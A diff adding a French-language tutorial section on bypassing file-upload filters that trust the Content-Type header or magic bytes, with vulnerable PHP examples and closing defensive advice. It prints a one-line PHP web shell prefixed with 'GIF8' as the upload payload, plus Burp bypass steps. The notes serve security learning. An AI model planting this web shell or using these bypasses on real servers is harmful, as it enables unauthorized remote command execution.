@@ -296,4 +296,94 @@ Cette wordlist peut ensuite être testée avec Burp Intruder pour trouver des by
 
 ---
 
+# Type Filters
 
+## Principe
+
+Les filtres basés uniquement sur l’extension ne suffisent pas (`shell.php.jpg` reste dangereux).  
+Les serveurs modernes ajoutent une vérification **du contenu** pour s’assurer qu’il correspond bien au type attendu (images, vidéos, docs).  
+Deux méthodes principales existent :  
+
+1. Validation via **Content-Type** (HTTP header).  
+2. Validation via **MIME-Type** (magic bytes du fichier).  
+
+## Exemple 1 : Content-Type Header
+
+Exemple de code PHP vulnérable :  
+
+`$type = $_FILES['uploadFile']['type'];`  
+
+`if (!in_array($type, array('image/jpg','image/jpeg','image/png','image/gif'))) {`  
+&nbsp;&nbsp;&nbsp;&nbsp;`echo "Only images are allowed";`  
+&nbsp;&nbsp;&nbsp;&nbsp;`die();`  
+`}`  
+
+- Ici, `$type` dépend de l’en-tête **Content-Type** envoyé par le client.  
+- Comme le navigateur fixe ce champ → **contrôlable par l’attaquant**.  
+
+### Bypass
+
+1. Intercepter la requête (Burp).  
+2. Modifier `Content-Type: image/jpg` pour un fichier `shell.php`.  
+3. Résultat : *File successfully uploaded* → le code s’exécute.  
+
+Astuce : attention, une requête upload a **2 Content-Type** possibles :  
+- Celui global de la requête multipart.  
+- Celui de la partie fichier → c’est souvent celui-ci qu’il faut modifier.
+
+---
+
+## Exemple 2 : MIME-Type (Magic Bytes)
+
+Exemple de code PHP :  
+
+`$type = mime_content_type($_FILES['uploadFile']['tmp_name']);`  
+
+`if (!in_array($type, array('image/jpg','image/jpeg','image/png','image/gif'))) {`  
+&nbsp;&nbsp;&nbsp;&nbsp;`echo "Only images are allowed";`  
+&nbsp;&nbsp;&nbsp;&nbsp;`die();`  
+`}`  
+
+- Ici, PHP lit directement les **premiers octets** du fichier (signature magique).  
+- Plus fiable, mais toujours contournable.  
+
+### Démonstration
+
+`echo "this is a text file" > text.jpg`  
+→ `file text.jpg` → ASCII text.  
+
+`echo "GIF8" > text.jpg`  
+→ `file text.jpg` → GIF image data.  
+
+Donc en ajoutant `GIF8` au début d’un fichier PHP :  
+
+- MIME = image/gif.  
+- Extension = `.php`.  
+- Résultat : le serveur exécute le PHP.  
+
+Exemple :  
+Fichier `shell.php` commençant par :  
+
+`GIF8`  
+`<?php system($_REQUEST['cmd']); ?>`  
+
+→ Uploader.  
+→ Exécution : sortie = `GIF8` (première ligne), puis résultat de la commande.  
+
+## Combinaisons Possibles
+
+On peut jouer sur :  
+
+- **Extension autorisée** + MIME/Content-Type piégés.  
+- **MIME valide** + extension bloquée.  
+- **Content-Type valide** + contenu malicieux.  
+
+Selon le niveau de sécurité du code, certains combos passent encore.  
+
+## Points Clés
+
+- **Content-Type** : faible, car côté client.  
+- **MIME-Type** : plus fort, mais contournable (magic bytes).  
+- **Meilleure pratique** : vérifier extension + MIME + analyser réellement le contenu.  
+
+---
